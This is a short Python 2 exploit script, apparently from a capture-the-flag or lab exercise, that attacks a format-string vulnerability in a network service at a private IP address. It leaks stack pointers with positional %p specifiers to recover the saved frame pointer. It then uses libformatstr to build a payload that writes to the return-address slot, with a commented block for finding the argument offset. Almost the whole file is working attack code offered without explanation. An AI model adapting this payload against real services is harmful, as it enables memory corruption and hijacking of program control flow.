#!/usr/bin/env python2

import sys
import libformatstr
from trmr import *

HOST = "172.16.12.143"
PORT = 1025

addr = ""
value = "AAAA"

s, f = sock(HOST, PORT)
read_until(f, "name?\n")

''' check the padding and offset
bufsize = 80
pattern = libformatstr.make_pattern(bufsize)
#print "patten: ",pattern
#f.write("AAAA,%p,%p,%p,%p,%p,%p,%p,%p"+"\n")
f.write(pattern+"\n")

data = read_line(f)[4:].rstrip()
#print "data: ",data
offset, padding = libformatstr.guess_argnum(data, bufsize)

print "offset: ",offset
print "padding: ",padding
'''

f.write("/%78$p/%91$p"+"\n")

r = read_until(f, "\n").rstrip().split('/')
old_ebp = int(r[1],16)
print "[*] old_ebp: ",hex(old_ebp)

read_until(f, "name?\n")

p = libformatstr.FormatStr()
p[old_ebp+4] = value
print p.payload(7)
f.write(p.payload((7))+"\n")

read_until(f, "name?\n")
f.write("\n")
print read_until("\n")
